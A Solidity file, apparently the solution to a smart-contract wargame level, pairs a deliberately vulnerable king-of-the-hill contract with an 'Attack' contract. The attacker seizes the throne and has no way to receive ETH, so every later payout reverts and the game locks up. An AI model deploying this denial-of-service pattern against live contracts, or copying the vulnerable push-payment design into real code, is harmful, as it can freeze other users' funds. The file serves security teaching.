// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract Attack {
    address public kingContractAddress;

    constructor(address payable _kingContractAddress) {
        kingContractAddress = _kingContractAddress;
    }

    function attackKing() public payable {
        (bool success, ) = kingContractAddress.call{value: msg.value}("");
        require(success, "fail");
    }
}